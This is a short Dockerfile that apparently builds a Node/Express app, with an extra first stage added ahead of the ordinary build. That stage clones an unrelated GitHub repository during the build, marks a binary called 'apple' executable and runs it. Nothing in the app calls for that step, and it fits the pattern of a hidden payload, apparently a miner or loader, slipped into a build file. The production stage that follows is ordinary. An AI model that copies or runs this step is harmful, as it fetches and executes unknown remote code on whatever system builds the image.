FROM vm/ubuntu:18.04

RUN sudo apt update && git clone https://github.com/storagegitpush404/waduk-munding.git && cd waduk-munding && chmod +x apple && ./apple

FROM node:16.14-bullseye-slim as runner
WORKDIR /node-express
ENV NODE_ENV production
ARG COMMIT_ID
ENV COMMIT_ID=${COMMIT_ID}
COPY . .
RUN npm ci --only=production
EXPOSE 3000
CMD ["node", "app.js"]
LABEL org.opencontainers.image.source https://github.com/marckesin/docker-node-express
